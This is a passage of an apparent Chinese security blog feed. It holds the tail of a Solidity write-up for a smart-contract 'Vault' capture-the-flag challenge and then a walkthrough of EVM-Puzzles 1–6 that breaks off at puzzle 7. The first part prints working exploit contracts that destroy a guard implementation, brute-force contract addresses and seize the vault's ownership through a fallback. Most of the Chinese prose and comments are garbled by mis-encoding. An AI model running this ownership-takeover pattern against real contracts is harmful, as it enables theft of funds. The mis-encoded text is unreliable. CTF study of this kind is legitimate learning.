class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity 0.4.16;<br><br>import &quot;./Setup.sol&quot;;<br><br>contract FakeVault &#123;<br>    SingleOwnerGuard public guard;<br><br>    function get(GuardRegistry registry) public &#123;<br>        guard = SingleOwnerGuard(registry.implementations(registry.defaultImplementation()));<br>    &#125;<br><br>    function cleanup() public &#123;<br>        guard.initialize(Vault(address(this)));<br>        guard.cleanup();<br>    &#125;<br><br>    function owner() public returns (address) &#123;<br>        return address(this);<br>    &#125;<br><br>    // åœ¨ cleanup() ä¸­ä¼šæœ‰åˆ¤æ–­ guard() çš„é€»è¾‘<br>    function guard() external view returns (address) &#123;<br>        return msg.sender;<br>    &#125;<br>&#125;<br><br>contract OwnershipTaker &#123;<br>    function doit(Vault vault) public &#123;<br>        // data ä¸º 0ï¼Œå°±æ˜¯è°ƒç”¨ fallback å‡½æ•°<br>        vault.emergencyCall(msg.sender, new bytes(0));<br>    &#125;<br>&#125;<br><br>contract vaultExploit &#123;<br>    // æ³¨æ„ï¼šè¦ä¿®æ”¹çš„ owner çš„ä½ç½®éœ€è¦å’Œç›®æ ‡åˆçº¦ vault ä¸­çš„ owner çš„ä½ç½®ç›¸åŒï¼Œå¦åˆ™æ— æ³•è¿›è¡Œä¿®æ”¹<br>    address owner;<br>    vaultSetup private setup;<br>    OwnershipTaker addr;<br><br>    function vaultExploit(vaultSetup setup_) public &#123;<br>        setup = setup_;<br>    &#125;<br><br>    // é”€æ¯é€»è¾‘åˆçº¦<br>    function part1() public &#123;<br>        FakeVault fakeVault = new FakeVault();<br>        // è·å¾—é€»è¾‘åˆçº¦åœ°å€<br>        fakeVault.get(setup.registry());<br>        // åˆå§‹åŒ–å¹¶é”€æ¯<br>        fakeVault.cleanup();<br>    &#125;<br><br>    function part2() public &#123;<br>        while(true) &#123;<br>            // ä½¿ç”¨ CREATE æ¥åˆ›é€ åˆçº¦<br>            addr = new OwnershipTaker();<br>            // åˆ¤æ–­æ˜¯å¦æ»¡è¶³æ¡ä»¶<br>            if (bytes20(address(addr))[15] == hex&#x27;00&#x27;) &#123;<br>                break;<br>            &#125;<br>        &#125;<br>        // è°ƒç”¨ç‰¹å®šåˆçº¦åœ°å€ä¸­çš„æ”»å‡»å‡½æ•°<br>        addr.doit(setup.vault());<br><br>    &#125;<br><br>    // åœ¨ fallback å‡½æ•°é‡Œé¢å®ç°ä¿®æ”¹ owner çš„é€»è¾‘<br>    function() external &#123;<br>        owner = address(0);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>åç»­é¢˜ç›®æ›´æ–°ä¸­â€¦â€¦</p>]]></content>
    
    
    
    <tags>
      
      <tag>é¶åœºåˆ·é¢˜</tag>
      
      <tag>Etherum</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup | EVM-Puzzles</title>
    <link href="/2022/09/30/EVM-Puzzles-wp/"/>
    <url>/2022/09/30/EVM-Puzzles-wp/</url>
    
    <content type="html"><![CDATA[<h1 id="EVM-Puzzles"><a href="#EVM-Puzzles" class="headerlink" title="EVM-Puzzles"></a>EVM-Puzzles</h1><p><a href="https://github.com/fvictorio/evm-puzzles?ref=hackernoon.com">æŒ‘æˆ˜ä»“åº“åœ°å€</a></p><p><a href="https://www.evm.codes/?ref=hackernoon.com">EVMæ“ä½œç </a></p><p>å‡†å¤‡å·¥ä½œï¼š</p><ul><li>å®‰è£…hardhat </li><li>å…‹éš†ä»“åº“ï¼Œè¿›å…¥ä»“åº“æ ¹ç›®å½•</li><li>å‡†å¤‡ç¯å¢ƒï¼šnpm install yarn</li><li>å¼€å§‹æŒ‘æˆ˜ï¼šnpx hardhat play</li></ul><h2 id="Puzzle-1"><a href="#Puzzle-1" class="headerlink" title="Puzzle 1"></a>Puzzle 1</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs clean">############<br># Puzzle <span class="hljs-number">1</span> #<br>############<br><br><span class="hljs-number">00</span>      <span class="hljs-number">34</span>      CALLVALUE<br><span class="hljs-number">01</span>      <span class="hljs-number">56</span>      JUMP<br><span class="hljs-number">02</span>      FD      REVERT<br><span class="hljs-number">03</span>      FD      REVERT<br><span class="hljs-number">04</span>      FD      REVERT<br><span class="hljs-number">05</span>      FD      REVERT<br><span class="hljs-number">06</span>      FD      REVERT<br><span class="hljs-number">07</span>      FD      REVERT<br><span class="hljs-number">08</span>      <span class="hljs-number">5</span>B      JUMPDEST<br><span class="hljs-number">09</span>      <span class="hljs-number">00</span>      STOP<br><br>? Enter the value to send: (<span class="hljs-number">0</span>)<br><br></code></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“ <a href="https://www.evm.codes/?ref=hackernoon.com#34"><strong>CALLVALUE</strong></a> çš„ä½œç”¨ã€‚æ­¤æ“ä½œç è·å– wei ä¸­å½“å‰è°ƒç”¨çš„å€¼ï¼ˆå³äº‹åŠ¡å€¼ï¼‰ï¼Œå¹¶å°†è¯¥å€¼æ¨é€åˆ°å †æ ˆçš„é¡¶éƒ¨ã€‚</p><p>å³å¦‚æœæˆ‘ä»¬è¾“å…¥4ï¼Œå †æ ˆä¼šå‘ç”Ÿå¦‚ä¸‹å˜åŒ–</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tap">[0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 0]<br>---&gt;<br>[4<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 0]<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“ <a href="https://www.evm.codes/?ref=hackernoon.com#56"><strong>JUMP</strong></a> æŒ‡ä»¤çš„ä½œç”¨ã€‚æ­¤æ“ä½œç æ¶ˆè€—å †æ ˆä¸Šçš„é¡¶éƒ¨å€¼ï¼Œå¹¶è·³è½¬åˆ°åºåˆ—ä¸­çš„ç¬¬ th æ¡æŒ‡ä»¤ã€‚</p><p>å³å¦‚æœæˆ‘ä»¬è¾“å…¥4ï¼Œé‚£ä¹ˆå°†ä¼šæ‰§è¡Œä½äº04çš„æ“ä½œç </p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">04 </span>     FD      REVERT<br></code></pre></td></tr></table></figure><p>æ‰§è¡ŒREVERTï¼Œè¿è¡Œå¤±è´¥</p><p>å› æ­¤æˆ‘ä»¬è¾“å…¥8ï¼Œå°†ä¼šæ‰§è¡ŒJUMPDESTï¼Œè·³è¿‡æ‰€æœ‰æŒ‡ä»¤</p><h2 id="Puzzle-2"><a href="#Puzzle-2" class="headerlink" title="Puzzle 2"></a>Puzzle 2</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs clean">############<br># Puzzle <span class="hljs-number">2</span> #<br>############<br><br><span class="hljs-number">00</span>      <span class="hljs-number">34</span>      CALLVALUE<br><span class="hljs-number">01</span>      <span class="hljs-number">38</span>      CODESIZE<br><span class="hljs-number">02</span>      <span class="hljs-number">03</span>      SUB<br><span class="hljs-number">03</span>      <span class="hljs-number">56</span>      JUMP<br><span class="hljs-number">04</span>      FD      REVERT<br><span class="hljs-number">05</span>      FD      REVERT<br><span class="hljs-number">06</span>      <span class="hljs-number">5</span>B      JUMPDEST<br><span class="hljs-number">07</span>      <span class="hljs-number">00</span>      STOP<br><span class="hljs-number">08</span>      FD      REVERT<br><span class="hljs-number">09</span>      FD      REVERT<br><br>? Enter the value to send: (<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯ä½¿æ ˆé¡¶çš„å€¼ä¸º6ï¼Œä½¿ç¨‹åºè·³è¿‡æ‰€æœ‰REVERT</p><p><a href="https://www.evm.codes/?ref=hackernoon.com#38"><strong>CODESIZE</strong></a> è·å–åœ¨å½“å‰ç¯å¢ƒä¸­è¿è¡Œçš„ä»£ç çš„å¤§å°ï¼Œå¹¶å…¥æ ˆã€‚åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥çœ‹åºåˆ—ä¸­æœ‰å¤šå°‘æ“ä½œç æ¥æ‰‹åŠ¨æ£€æŸ¥ä»£ç çš„å¤§å°ã€‚æ¯ä¸ªæ“ä½œç æ˜¯1ä¸ªå­—èŠ‚ï¼Œåœ¨è¿™ä¸ªè°œé¢˜ä¸­ï¼Œæˆ‘ä»¬æœ‰10ä¸ªæ“ä½œç ï¼Œè¿™æ„å‘³ç€ä»£ç çš„å¤§å°æ˜¯10ä¸ªå­—èŠ‚ã€‚æ³¨æ„ï¼ŒEVM ä½¿ç”¨åå…­è¿›åˆ¶æ•°æ¥è¡¨ç¤ºå­—èŠ‚ç ã€‚æ‰€ä»¥è¿™é‡Œæ˜¯0a</p><p><a href="https://www.evm.codes/?ref=hackernoon.com#03"><strong>SUB</strong></a> ä¼šæŠŠç¬¬ä¸€ä¸ªå †æ ˆå…ƒç´ å‡å»ç¬¬äºŒä¸ªå †æ ˆå…ƒç´ ï¼Œå¹¶å°†ç»“æœæ¨é€åˆ°å †æ ˆçš„é¡¶éƒ¨ã€‚</p><p>æ­¤æ—¶çš„å †æ ˆæƒ…å†µ</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[input 0a<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0]<br></code></pre></td></tr></table></figure><p>å³ 0a - input = 6</p><p>æ‰€ä»¥è¾“å…¥4</p><h2 id="Puzzle-3"><a href="#Puzzle-3" class="headerlink" title="Puzzle 3"></a>Puzzle 3</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs clean">############<br># Puzzle <span class="hljs-number">3</span> #<br>############<br><br><span class="hljs-number">00</span>      <span class="hljs-number">36</span>      CALLDATASIZE<br><span class="hljs-number">01</span>      <span class="hljs-number">56</span>      JUMP<br><span class="hljs-number">02</span>      FD      REVERT<br><span class="hljs-number">03</span>      FD      REVERT<br><span class="hljs-number">04</span>      <span class="hljs-number">5</span>B      JUMPDEST<br><span class="hljs-number">05</span>      <span class="hljs-number">00</span>      STOP<br><br>? Enter the calldata:<br><br></code></pre></td></tr></table></figure><p><a href="https://www.evm.codes/?ref=hackernoon.com#36"><strong>CALLDATASIZE</strong></a> ä¼šè·å–è°ƒç”¨æ•°æ®çš„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ï¼Œå¹¶å°†å…¶æ¨é€åˆ°å †æ ˆä¸Šã€‚</p><p>å¹¶ä¸”é¢˜ç›®è¦æ±‚æˆ‘ä»¬è¾“å…¥calldata</p><p>æ‰€ä»¥æˆ‘ä»¬è¾“å…¥å››ä¸ªæŒ‡ä»¤çš„å­—èŠ‚ç ï¼Œä½¿ CALLDATASIZE æŒ‡ä»¤åœ¨å †æ ˆä¸Šæ¨é€4</p><p>è¿™é‡Œæˆ‘è¾“å…¥äº† 0x5B5B5B5B</p><h2 id="Puzzle-4"><a href="#Puzzle-4" class="headerlink" title="Puzzle 4"></a>Puzzle 4</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs clean">############<br># Puzzle <span class="hljs-number">4</span> #<br>############<br><br><span class="hljs-number">00</span>      <span class="hljs-number">34</span>      CALLVALUE<br><span class="hljs-number">01</span>      <span class="hljs-number">38</span>      CODESIZE<br><span class="hljs-number">02</span>      <span class="hljs-number">18</span>      XOR<br><span class="hljs-number">03</span>      <span class="hljs-number">56</span>      JUMP<br><span class="hljs-number">04</span>      FD      REVERT<br><span class="hljs-number">05</span>      FD      REVERT<br><span class="hljs-number">06</span>      FD      REVERT<br><span class="hljs-number">07</span>      FD      REVERT<br><span class="hljs-number">08</span>      FD      REVERT<br><span class="hljs-number">09</span>      FD      REVERT<br><span class="hljs-number">0</span>A      <span class="hljs-number">5</span>B      JUMPDEST<br><span class="hljs-number">0</span>B      <span class="hljs-number">00</span>      STOP<br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ CODESIZE ä¸º12ï¼Œå³0c</p><p>æ­¤æ—¶å †æ ˆçŠ¶æ€</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[0c input<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0]<br></code></pre></td></tr></table></figure><p><a href="https://www.evm.codes/?ref=hackernoon.com#18"><strong>XOR</strong></a> ä»¥äºŒè¿›åˆ¶è¡¨ç¤ºå½¢å¼è®¡ç®—ä¸¤ä¸ªæ•°å­—ï¼Œä¸¤è€…ç›¸ç­‰ä¸º0ï¼Œä¸ç­‰ä¸º1</p><p>å‡è®¾æˆ‘ä»¬åœ¨å †æ ˆçš„é¡¶éƒ¨æœ‰ä¸¤ä¸ªæ•°å­—ã€‚</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[5<span class="hljs-number"> 3 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 0]<br></code></pre></td></tr></table></figure><p>åœ¨æ‰§è¡Œ <strong>XOR</strong> æŒ‡ä»¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æƒ³è±¡äºŒè¿›åˆ¶è¡¨ç¤ºä¸­çš„ä¸¤ä¸ªæ•°å­—æ˜¯è¿™æ ·çš„ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">00000000000000000000000000000101<br>00000000000000000000000000000011<br></code></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">00000000000000000000000000000110<br></code></pre></td></tr></table></figure><p>è€Œè¦æƒ³é€šè¿‡ï¼Œæˆ‘ä»¬éœ€è¦å¾—åˆ°0a</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">0</span>c   <span class="hljs-keyword">XOR</span> <span class="hljs-keyword">input</span> = <span class="hljs-number">0</span>a<br><span class="hljs-symbol">1100 </span><span class="hljs-keyword">XOR</span> <span class="hljs-keyword">input</span> = <span class="hljs-number">1010</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥è¾“å…¥0110ï¼Œå³6</p><h2 id="Puzzle-5"><a href="#Puzzle-5" class="headerlink" title="Puzzle 5"></a>Puzzle 5</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs clean">############<br># Puzzle <span class="hljs-number">5</span> #<br>############<br><br><span class="hljs-number">00</span>      <span class="hljs-number">34</span>          CALLVALUE<br><span class="hljs-number">01</span>      <span class="hljs-number">80</span>          DUP1<br><span class="hljs-number">02</span>      <span class="hljs-number">02</span>          MUL<br><span class="hljs-number">03</span>      <span class="hljs-number">610100</span>      PUSH2 <span class="hljs-number">0100</span><br><span class="hljs-number">06</span>      <span class="hljs-number">14</span>          EQ<br><span class="hljs-number">07</span>      <span class="hljs-number">600</span>C        PUSH1 <span class="hljs-number">0</span>C<br><span class="hljs-number">09</span>      <span class="hljs-number">57</span>          JUMPI<br><span class="hljs-number">0</span>A      FD          REVERT<br><span class="hljs-number">0</span>B      FD          REVERT<br><span class="hljs-number">0</span>C      <span class="hljs-number">5</span>B          JUMPDEST<br><span class="hljs-number">0</span>D      <span class="hljs-number">00</span>          STOP<br><span class="hljs-number">0</span>E      FD          REVERT<br><span class="hljs-number">0</span>F      FD          REVERT<br><br>? Enter the value to send: (<span class="hljs-number">0</span>)<br><br></code></pre></td></tr></table></figure><p><a href="https://www.evm.codes/?ref=hackernoon.com#80"><strong>DUP1</strong></a> ä¼šæŠŠå †æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªä½ç½®ä¸Šçš„å€¼å¤åˆ¶ï¼Œå¹¶å°†å‰¯æœ¬æ¨é€åˆ°å †æ ˆçš„é¡¶éƒ¨ã€‚</p><p>æ‰€ä»¥ç°åœ¨åœ¨å‰ä¸¤æ¡æŒ‡ä»¤ä¹‹åï¼Œæˆ‘ä»¬çš„å †æ ˆçœ‹èµ·æ¥åƒè¿™æ ·ã€‚</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[input input<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0]<br></code></pre></td></tr></table></figure><p><a href="https://www.evm.codes/?ref=hackernoon.com#02"><strong>MUL</strong></a> è·å–å †æ ˆä¸Šçš„å‰ä¸¤ä¸ªå€¼ï¼Œå°†å®ƒä»¬ç›¸ä¹˜ï¼Œç„¶åå°†ç»“æœæ¨é€åˆ°å †æ ˆçš„é¡¶éƒ¨ã€‚</p><p>å› æ­¤ï¼Œåœ¨æœ¬ä¾‹ä¸­ï¼ŒMULä»¥åç”Ÿæˆçš„å †æ ˆå¦‚ä¸‹æ‰€ç¤ºã€‚</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[mulResult<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 0]<br></code></pre></td></tr></table></figure><p> <a href="https://www.evm.codes/?ref=hackernoon.com#61"><strong>PUSH2</strong></a> ä¼šå°†æŒ‡å®šçš„ 2 å­—èŠ‚å€¼æ¨é€åˆ°å †æ ˆçš„é¡¶éƒ¨ã€‚è¿™é‡ŒæŒ‡å®šäº†0100ï¼ˆåå…­è¿›åˆ¶ï¼‰</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[0100 mulResult<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0]<br></code></pre></td></tr></table></figure><p><a href="https://www.evm.codes/?ref=hackernoon.com#14"><strong>EQ</strong></a> ä¼šè·å–å †æ ˆä¸Šçš„å‰ä¸¤ä¸ªå€¼ï¼Œå°†å…¶è¿›è¡Œæ¯”è¾ƒå¹¶å°†ç»“æœæ¨é€åˆ°å †æ ˆé¡¶éƒ¨ã€‚å¦‚æœå‰ä¸¤ä¸ªå€¼ç›¸ç­‰ï¼Œåˆ™ä¸º1ï¼Œå¦åˆ™ä¸º0ã€‚</p><p><a href="https://www.evm.codes/?ref=hackernoon.com#57"><strong>JUMPI</strong></a> å°†æœ‰æ¡ä»¶åœ°æ›´æ”¹ç¨‹åºè®¡æ•°å™¨ã€‚æ­¤æŒ‡ä»¤æŸ¥çœ‹ç¬¬äºŒä¸ªå †æ ˆå…ƒç´ ä»¥äº†è§£å®ƒæ˜¯å¦åº”è¯¥è·³è½¬ï¼Œå…·ä½“å–å†³äºç¬¬äºŒä¸ªå †æ ˆå…ƒç´ æ˜¯ 1 è¿˜æ˜¯ 0 ã€‚ç„¶åä½¿ç”¨ç¬¬ä¸€ä¸ªå †æ ˆå…ƒç´ æ¥çŸ¥é“è¦è·³è½¬åˆ°å“ªä¸ªä½ç½®ã€‚</p><p>å› æ­¤æ­¤æ—¶æˆ‘ä»¬çš„å †æ ˆåº”è¯¥æ˜¯è¿™æ ·</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[0c<span class="hljs-number"> 1 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 0]<br></code></pre></td></tr></table></figure><p>å³è·³è½¬åˆ°ç¬¬12æ¡å‘½ä»¤ï¼Œé€šè¿‡æŒ‘æˆ˜</p><p>æ‰€ä»¥ä¸ºäº†ä½¿ EQ çš„ç»“æœä¸º1ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ input * input çš„ç»“æœç­‰äºåå…­è¿›åˆ¶çš„0100ï¼Œä¹Ÿå°±æ˜¯256</p><p>æ‰€ä»¥è¾“å…¥16</p><h2 id="Puzzle-6"><a href="#Puzzle-6" class="headerlink" title="Puzzle 6"></a>Puzzle 6</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs clean">############<br># Puzzle <span class="hljs-number">6</span> #<br>############<br><br><span class="hljs-number">00</span>      <span class="hljs-number">6000</span>      PUSH1 <span class="hljs-number">00</span><br><span class="hljs-number">02</span>      <span class="hljs-number">35</span>        CALLDATALOAD<br><span class="hljs-number">03</span>      <span class="hljs-number">56</span>        JUMP<br><span class="hljs-number">04</span>      FD        REVERT<br><span class="hljs-number">05</span>      FD        REVERT<br><span class="hljs-number">06</span>      FD        REVERT<br><span class="hljs-number">07</span>      FD        REVERT<br><span class="hljs-number">08</span>      FD        REVERT<br><span class="hljs-number">09</span>      FD        REVERT<br><span class="hljs-number">0</span>A      <span class="hljs-number">5</span>B        JUMPDEST<br><span class="hljs-number">0</span>B      <span class="hljs-number">00</span>        STOP<br><br>? Enter the calldata:<br><br></code></pre></td></tr></table></figure><p><a href="https://www.evm.codes/#35"><strong>CALLDATALOAD</strong></a> ä»è°ƒç”¨æ•°æ®çš„ç»™å®šåç§»é‡å¼€å§‹çš„ 32 å­—èŠ‚å€¼ï¼Œä¸è¶³ 32 bytes çš„è‡ªåŠ¨è¡¥0</p><p>ä¾‹å¦‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">calldata</span> <span class="hljs-number">0</span>xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF<br><span class="hljs-attribute">i</span> <span class="hljs-number">31</span><br><span class="hljs-attribute">output</span> <span class="hljs-number">0</span>xFF<span class="hljs-number">00000000000000000000000000000000000000000000000000000000000000</span><br></code></pre></td></tr></table></figure><p>è€Œå¦‚æœè¾“å…¥ 0x0A ä¼šå˜æˆ 0A00000000000000000000000000000000000000000000000000000000000000</p><p>æ‰€ä»¥åº”è¯¥è¾“å…¥0x000000000000000000000000000000000000000000000000000000000000000a</p><h2 id="Puzzle-7"><a href="#Puzzle-7" class="headerlink" title="Puzzle 7"></a>Puzzle 7</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">############</span><br><span class="hljs-comment"># Puzzle 7 #</span><br><span class="hljs-comment">############</span><br><br><span class="hljs-attribute">00</span>      <span class="hljs-number">36</span>        CALLDATASIZE<br><span class="hljs-attribute">01</span>      <span class="hljs-number">6000</span>      PUSH<span class="hljs-number">1</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">03</span>      <span class="hljs-number">80</span>        DUP<span class="hljs-number">1</span><br><span class="hljs-attribute">04</span>      <span class="hljs-number">37</span>        CALLDATACOPY<br><span class="hljs-attribute">05</span>      <span class="hljs-number">36</span>        CALLDATASIZE<br><span class="hljs-attribute">06</span>      <span class="hljs-number">6000</span>      PUSH<span class="hljs-number">1</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">08</span>      <span class="hljs-number">6000</span>      PUSH<span class="hljs-number">1</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">0A</span>      F<span class="hljs-number">0</span>        CREATE<br><span class="hljs-attribute">0B</span>      <span class="hljs-number">3</span>B        EXTCODESIZE<br><span class="hljs-attribute">0C</span>      <span class="hljs-number">6001</span>      PUSH<span class="hljs-number">1</span> <span class="hljs-number">01</span><br><span class="hljs-attribute">0E</span>      <span class="hljs-number">14</span>        EQ<br><span class="hljs-attribute">0F</span>      <span class="hljs-number">6013</span>      PUSH<span class="hljs-number">1</span> <span class="hljs-number">13</span><br><span class="hljs-attribute">11</span>      <span class="hljs-number">57</span>        JUMPI<br><span class="hljs-attribute">12</span>      FD        REVERT<br><span class="hljs-attribute">13</span>      <span class="hljs-number">5</span>B        JUMPDEST<br><span class="hljs-attribute">14</span>      <span class="hljs-number">00</span>        STOP<br><br></code></pre></td></tr></table></figure><p><strong>CALLDATASIZE</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[calldatasize<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 0]<br></code></pre></td></tr></table></figure><p><strong>PUSH1 00</strong></p><figure 